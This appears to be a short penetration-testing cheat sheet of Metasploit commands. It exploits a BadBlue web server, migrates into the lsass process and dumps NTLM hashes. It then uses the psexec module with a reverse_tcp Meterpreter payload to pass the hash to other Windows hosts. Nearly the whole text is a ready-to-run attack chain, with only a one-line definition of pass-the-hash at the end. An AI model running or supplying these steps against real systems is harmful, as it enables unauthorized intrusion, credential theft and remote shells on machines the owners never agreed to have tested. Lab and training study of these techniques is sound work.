## Gain Initial Access via Web Server Vulnerability

```text
msf6 > exploit/windows/http/badblue_passthru
```

## List Processes

```text
meter > pgrep -l lsass
```

## Migrate to Target Process

```text
meter > migrate <PID>
```

## Check Current User

```text
meter > getuid
```

## Dump NL and NTLM Hashes

```text
meter > hashdump
```

---

## Pass-the-Hash with PsExec

```text
msf6 > use exploit/windows/smb/psexec

set SMBUser <USER>
set SMBPass <PASS or LM:NTLM>
set TARGET Native\ upload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

exploit
```

---

## Pass-the-Hash
Pass-the-Hash is an exploitation technique that uses captured NTLM hashes or clear-text passwords to authenticate to a target system without knowing the original password.
